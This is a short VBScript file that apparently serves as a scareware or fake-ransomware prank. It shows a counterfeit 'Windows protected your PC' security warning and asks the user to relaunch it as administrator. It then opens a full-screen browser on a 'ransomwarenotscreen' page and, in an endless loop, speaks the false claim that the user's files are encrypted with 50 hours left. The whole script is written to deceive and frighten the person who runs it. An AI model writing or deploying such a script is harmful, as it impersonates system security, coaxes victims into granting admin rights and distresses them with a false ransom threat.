' Create a WScript Shell object
Set WshShell = CreateObject("WScript.Shell")

' Show a message to the user
WshShell.Popup "Windows protected your PC", 10, "Security Warning", 64

' Ask the user to run as an administrator
If WshShell.Popup("Do you want to run as an administrator?", 0, "Run as Administrator", 4 + 32) = 6 Then
    ' If Yes is clicked, run the script with administrator privileges
    WshShell.Run "runas /user:administrator ""cscript.exe //nologo """ & WScript.ScriptFullName & """"
End If

Dim ie
Set ie = CreateObject("InternetExplorer.Application")
ie.Visible = True
ie.FullScreen = True
ie.Navigate "https://sites.google.com/view/ransomwarenotscreen/home" ' Replace with your desired URL

Do While ie.Busy Or ie.ReadyState <> 4
    WScript.Sleep 100
Loop
do
CreateObject("sapi.spVoice").speak "UH OH YOUR FILES HAS BEEN ENCRYPTED. YOU CANT EVER GET THEM BACK NOW HAHAHA. YOU HAVE 50 HOURS TO USE YOUR COMPUTER. USE IT WISEY HAHAHA"
loop
